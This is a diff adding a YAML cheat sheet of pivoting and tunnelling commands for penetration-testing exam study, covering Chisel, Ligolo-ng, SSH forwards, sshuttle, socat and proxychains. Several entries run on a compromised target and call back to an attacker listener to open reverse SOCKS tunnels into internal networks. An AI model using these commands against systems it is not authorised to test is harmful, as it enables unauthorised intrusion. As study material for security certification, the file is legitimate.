@@ -1,0 +1,112 @@
+category: "pivoting"
+description: "Pivoting, tunneling, and port forwarding techniques"
+commands:
+  - name: "chisel-server"
+    description: "Start Chisel reverse proxy server (on attacker)"
+    command: "chisel server --reverse -p 8000"
+    tool: "chisel"
+    tags: ["pivot", "tunnel", "chisel", "server"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "chisel-client-socks"
+    description: "Chisel SOCKS proxy client (on target)"
+    command: "chisel client {LHOST}:8000 R:socks"
+    tool: "chisel"
+    tags: ["pivot", "tunnel", "chisel", "socks"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Creates SOCKS5 proxy on attacker :1080. Use with proxychains"
+
+  - name: "chisel-port-forward"
+    description: "Chisel specific port forward (on target)"
+    command: "chisel client {LHOST}:8000 R:8888:{TARGET_INTERNAL}:80"
+    tool: "chisel"
+    tags: ["pivot", "tunnel", "chisel", "forward"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "ligolo-setup"
+    description: "Ligolo-ng proxy setup (on attacker)"
+    command: "sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up; ligolo-proxy -selfcert"
+    tool: "ligolo-ng"
+    tags: ["pivot", "tunnel", "ligolo"]
+    os: "any"
+    exam: ["cpts"]
+    notes: "Ligolo-ng is THE pivoting tool for CPTS"
+
+  - name: "ligolo-agent"
+    description: "Ligolo-ng agent (on target)"
+    command: "ligolo-agent -connect {LHOST}:11601 -ignore-cert"
+    tool: "ligolo-ng"
+    tags: ["pivot", "tunnel", "ligolo"]
+    os: "any"
+    exam: ["cpts"]
+
+  - name: "ligolo-route"
+    description: "Add route through Ligolo tunnel"
+    command: "sudo ip route add {INTERNAL_SUBNET}/24 dev ligolo"
+    tool: "ligolo-ng"
+    tags: ["pivot", "tunnel", "ligolo", "route"]
+    os: "any"
+    exam: ["cpts"]
+
+  - name: "ssh-local-forward"
+    description: "SSH local port forwarding"
+    command: "ssh -L {LPORT}:{TARGET_INTERNAL}:80 {USER}@{IP} -N"
+    tool: "ssh"
+    tags: ["pivot", "ssh", "forward", "local"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Access internal service via localhost:{LPORT}"
+
+  - name: "ssh-dynamic-forward"
+    description: "SSH dynamic port forwarding (SOCKS)"
+    command: "ssh -D 1080 {USER}@{IP} -N"
+    tool: "ssh"
+    tags: ["pivot", "ssh", "socks", "dynamic"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Use with proxychains: proxychains nmap ..."
+
+  - name: "ssh-remote-forward"
+    description: "SSH remote port forwarding"
+    command: "ssh -R {LPORT}:localhost:80 {USER}@{LHOST} -N"
+    tool: "ssh"
+    tags: ["pivot", "ssh", "forward", "remote"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "sshuttle-vpn"
+    description: "VPN-like tunnel through SSH"
+    command: "sshuttle -r {USER}@{IP} {INTERNAL_SUBNET}/24"
+    tool: "sshuttle"
+    tags: ["pivot", "sshuttle", "vpn"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Transparent proxy - no proxychains needed"
+
+  - name: "proxychains-config"
+    description: "Proxychains SOCKS5 configuration"
+    command: "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf"
+    tool: "proxychains"
+    tags: ["pivot", "proxychains", "socks"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "proxychains-nmap"
+    description: "Nmap through proxychains (TCP only)"
+    command: "proxychains -q nmap -sT -Pn -p 21,22,80,88,135,139,389,443,445,3389,5985 {TARGET_INTERNAL}"
+    tool: "proxychains"
+    tags: ["pivot", "proxychains", "nmap", "scan"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Must use -sT (TCP connect). No SYN scan through proxy"
+
+  - name: "socat-port-forward"
+    description: "Socat port forwarding"
+    command: "socat TCP-LISTEN:{LPORT},fork TCP:{TARGET_INTERNAL}:80"
+    tool: "socat"
+    tags: ["pivot", "socat", "forward"]
+    os: "any"
+    exam: ["oscp", "cpts"]
